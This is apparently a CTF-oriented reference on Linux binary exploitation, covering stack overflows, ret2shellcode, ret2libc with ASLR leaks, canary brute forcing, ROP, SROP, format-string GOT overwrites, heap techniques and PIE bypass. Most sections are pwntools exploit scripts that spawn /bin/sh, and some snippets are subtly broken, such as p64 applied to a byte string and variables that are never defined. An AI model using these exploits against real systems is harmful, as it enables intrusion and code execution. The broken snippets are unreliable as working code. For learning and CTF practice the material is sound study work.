# Stack Overflow, ROP, and Binary Exploitation — Complete Reference

> From basic buffer overflow to advanced ROP chains, covering canary bypass, ret2libc, SROP, and modern protections.

---

## 1. Binary Protections Overview

Run `checksec` (from pwntools) to identify protections:

```bash
pwn checksec ./binary
```

| Protection | What it does | Bypass difficulty |
|-----------|-------------|-------------------|
| **NX** (No-eXecute) | Stack/heap non-executable | Medium (use ROP/ret2libc) |
| **PIE** (Position Independent) | Base address randomized | Medium (need leak) |
| **Canary** | Stack cookie before saved RIP | Hard (need leak or brute force) |
| **RELRO** | GOT write protection | Partial: can overwrite GOT; Full: cannot |
| **ASLR** | System-level address randomization | Medium (need info leak) |
| **FORTIFY** | Buffer overflow detection on common functions | Hard |

---

## 2. Basic Stack Overflow

### 2.1 Finding the Offset

```python
from pwn import *

# Method 1: Cyclic pattern
cyclic = cyclic(500)
# Send to program, check crash offset from segfault address
offset = cyclic_find(0x61616161)  # Replace with crashed address

# Method 2: Manual binary search
for i in range(1, 300):
    p = process("./binary")
    p.sendline(b"A" * i)
    try:
        p.recvline(timeout=1)
        p.close()
    except:
        print(f"Crash at offset ~{i}")
        break
```

### 2.2 Overwriting Saved RIP

```python
from pwn import *

offset = 72  # Determined from cyclic
payload = b"A" * offset
payload += p64(target_address)  # Overwrite saved RIP

p = process("./binary")
p.sendline(payload)
p.interactive()
```

---

## 3. Ret2shellcode (No NX)

When NX is disabled, inject and execute shellcode on the stack.

```python
from pwn import *

context.arch = "amd64"
offset = 72

# amd64 execve("/bin/sh") shellcode (~27 bytes)
shellcode = asm("""
    xor rdi, rdi
    mov al, 59
    xor rsi, rsi
    xor rdx, rdx
    push rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    syscall
""")

payload = shellcode
payload += b"A" * (offset - len(shellcode))
payload += p64(stack_address)  # Jump to stack

p = process("./binary")
p.sendline(payload)
p.interactive()
```

---

## 4. Ret2libc (NX enabled, no PIE)

When NX is enabled but PIE is disabled, use existing code in libc.

### 4.1 Basic Ret2libc (No ASLR / ASLR disabled)

```python
from pwn import *

elf = ELF("./binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

offset = 72
pop_rdi = 0x40123c  # ROP gadget: pop rdi; ret
ret = 0x40101a       # ROP gadget: ret (for stack alignment)

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)  # Stack alignment
payload += p64(libc.symbols["system"])

p = process("./binary")
p.sendline(payload)
p.interactive()
```

### 4.2 Ret2libc with ASLR (Need Leak)

```python
from pwn import *

elf = ELF("./binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Stage 1: Leak libc address via GOT
pop_rdi = 0x40123c
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])  # Return to main

p = process("./binary")
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))

libc_base = leak - libc.symbols["puts"]
print(f"libc base: {hex(libc_base)}")

# Stage 2: Call system("/bin/sh")
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols["system"]

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

---

## 5. Canary Bypass Techniques

### 5.1 Canary Leak via Format String

```python
from pwn import *

p = process("./binary")
p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p")  # Leak stack values
leaks = p.recvline().split(b".")
for i, leak in enumerate(leaks):
    print(f"{i}: {leak}")
# Look for canary pattern (ends with 00, random bytes)
```

### 5.2 Brute Force Canary (Byte-by-Byte)

If you can crash and restart the program (e.g., fork server):

```python
from pwn import *

canary = b""
for byte_pos in range(8):
    for byte_val in range(256):
        p = remote("target", 1337)
        payload = b"A" * offset_to_canary + canary + bytes([byte_val])
        p.send(payload)
        try:
            p.recvline(timeout=0.5)
            p.close()
            canary += bytes([byte_val])
            print(f"Canary byte {byte_pos}: {hex(byte_val)}")
            break
        except:
            p.close()
```

### 5.3 Stack Reading via Info Leak

Use format string or UAF to read canary from stack.

---

## 6. ROP (Return-Oriented Programming)

### 6.1 Finding Gadgets

```bash
ROPgadget --binary ./binary --only "pop|ret"
ropper --file ./binary --search "pop rdi"
r2 -qc "/R pop rdi" ./binary
```

### 6.2 Common ROP Gadgets (x86_64)

```
pop rdi; ret              # Set first argument
pop rsi; ret              # Set second argument
pop rdx; ret              # Set third argument
pop rax; ret              # Set syscall number
syscall; ret              # Execute syscall
xor rax, rax; ret         # Zero rax
mov qword ptr [rdi], rsi; ret   # Write to memory
```

### 6.3 ROP Chain: execve("/bin/sh", 0, 0)

```python
from pwn import *

elf = ELF("./binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP([elf, libc])

# Find gadgets
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]

# Write "/bin/sh" to writable memory
writable = elf.bss()  # Or find writable section
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rsi)
payload += p64(b"/bin/sh\x00")
payload += p64(elf.symbols["strcpy"])  # Or mov [rdi], rsi gadget

# Call execve
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)  # execve
payload += p64(syscall)
```

### 6.4 ret2syscall

```python
from pwn import *

# Direct syscall without libc
payload = b"A" * offset
payload += p64(pop_rax)
payload += p64(59)  # execve
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)
```

---

## 7. SROP (Sigreturn Oriented Programming)

When you can control the stack and have a `sigreturn` gadget:

```python
from pwn import *

context.arch = "amd64"

# syscall number for sigreturn: 15
# syscall number for execve: 59

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget

payload = b"A" * offset
payload += p64(syscall_gadget)   # First: syscall with rax=some_value
payload += p64(0xf)               # Then: set rax=15 (sigreturn)
payload += p64(syscall_gadget)   # Trigger sigreturn
payload += bytes(frame)
```

---

## 8. Format String Attacks

### 8.1 Information Leak

```python
from pwn import *

p = process("./binary")
# %p prints stack values
p.sendline(b"%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p")
leaks = p.recvline().split(b".")
```

### 8.2 Arbitrary Write (GOT Overwrite)

```python
from pwn import *

elf = ELF("./binary")

# Overwrite GOT entry of printf with system address
printf_got = elf.got["printf"]
system_addr = elf.symbols["system"]

# Calculate offset for format string
offset = 6  # Determined experimentally

payload = fmtstr_payload(offset, {printf_got: system_addr})
p.sendline(payload)
```

### 8.3 Stack Canary Leak

```python
# On stack, canary is usually at offset ~5-11 from format string start
p.sendline(b"%11$lx")  # Try different offsets
canary = int(p.recvline().strip(), 16)
```

---

## 9. Heap Exploitation Quick Reference

See `pwn_heap_exploitation.md` for detailed heap techniques.

Quick cheatsheet:

| Technique | Condition | Goal |
|-----------|-----------|------|
| **UAF** | Free后未清空指针 | Leak/修改堆块内容 |
| **Double Free** | 同一个chunk释放两次 | 控制fastbin/tcache链表 |
| **Tcache Poisoning** | glibc 2.26+ | 任意地址写 |
| **Fastbin Dup** | glibc < 2.26 | 分配到任意地址 |
| **Unsortedbin Attack** | 控制unsortedbin的bk | 写main_arena地址到任意位置 |
| **House of Spirit** | 伪造fastbin大小 | 在栈/BSS上分配chunk |
| **House of Einherjar** | off-by-one null | 合并到前一个chunk |
| **Largebin Attack** | 控制largebin的bk/bk_nextsize | 任意地址写large值 |

---

## 10. One Gadget

One gadget in libc executes `/bin/sh` with minimal constraints:

```bash
# Find one gadgets
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

Constraints typically involve:
- `rsp+0x30 == NULL`
- `rax == NULL`
- `[rsp+0x70] == NULL`

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget_offset = 0x45216  # From one_gadget output

payload = b"A" * offset
payload += p64(libc_base + one_gadget_offset)
```

---

## 11. PIE Bypass

### 11.1 Partial Overwrite

Overwrite only the low 1-2 bytes of the saved RIP to jump within the binary.

```python
payload = b"A" * offset
payload += b"\x56\x12"  # Only overwrite low 2 bytes
```

### 11.2 Info Leak + Full ROP

Leak a code address (e.g., via format string or function output), calculate base, then build full ROP.

---

## 12. Common CTF Pwn Patterns

| Pattern | Vulnerability | Quick Exploit |
|---------|--------------|---------------|
| Gets / strcpy buffer | Stack overflow | Cyclic + ROP/ret2libc |
| Format string in printf | FSB | `%p` leak → GOT overwrite |
| UAF in menu-driven heap | Use-After-Free | Tcache/fastbin poisoning |
| Off-by-one in loop | Heap overflow | House of Einherjar |
| Integer overflow in size | Bad size check | Tcache size field corruption |
| No RELRO | GOT writable | Overwrite GOT entry |
| Partial RELRO | dl_resolve available | ret2dlresolve |
| Fork server | Canary/PIE random but fixed | Brute force byte-by-byte |
